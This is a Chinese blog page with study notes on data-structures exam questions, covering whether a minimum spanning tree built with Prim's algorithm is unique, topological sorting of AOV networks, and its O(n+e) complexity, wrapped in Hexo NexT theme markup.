<p>会Prime就完事了，怎么判断是不是唯一呢？这个还挺麻烦的，简单说一下吧，当我们在利用Prime遍历边的时候，一旦遇见权值相同而且还不能用到你现在图里的就给你选的那个边做个标记（注意是你用的那个，不是重复的那些），而最后求的的MST如果没有这样的边就说明了生成树唯一，如果有标记了的边，那么就把这些边去了再看看能不能凑出一个MST来。<br>这题判断是否唯一很简单，因为最后一步9的时候就有好几条线可以用，所以一定不唯一</p>
<p><strong>2-13下图为一个AOV网，其可能的拓扑有序序列为</strong><br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fyb1qavg1ij30j608iq4a.jpg" alt=""><br>拓扑有序排列怎么玩呢？很简单，就是不停的删除入度为0的结点和其相关的边就好了。比如在这个题目里，我们先删除的应该是A，然后接着看，删除后B、D的入度变为了0，选择其中一个删除，重复直至所有的顶点都被我们取出来即可。</p>
<p><strong>2-14若将n个顶点e条弧的有向图采用邻接表存储，则拓扑排序算法的时间复杂度是</strong><br>n+e，记住吧</p>
<p><strong>2-14若将n个顶点e条弧的有向图采用邻接表存储，则拓扑排序算法的时间复杂度是：</strong><br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fyb1x9a76uj30ia06ut9h.jpg" alt=""><br>分享一个技巧，首先一开始只有A没有入度，所以开头一定是A，其次，B没有出度，所以B一定是最后一个，也就是A。。。B，我们删除A、B循环这个思想就完事了。<br>这里删除之后发现有个单独的e和另外一个图，那么e随时都可以插入所以就是3种位置，删除e，剩下的bc只有一种情况。<br>随意就是3种了。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Asa9ao</p>
              <p class="site-description motion-element" itemprop="description">It's not who I am underneath, but it's what I do that defines me</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Asa9ao</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
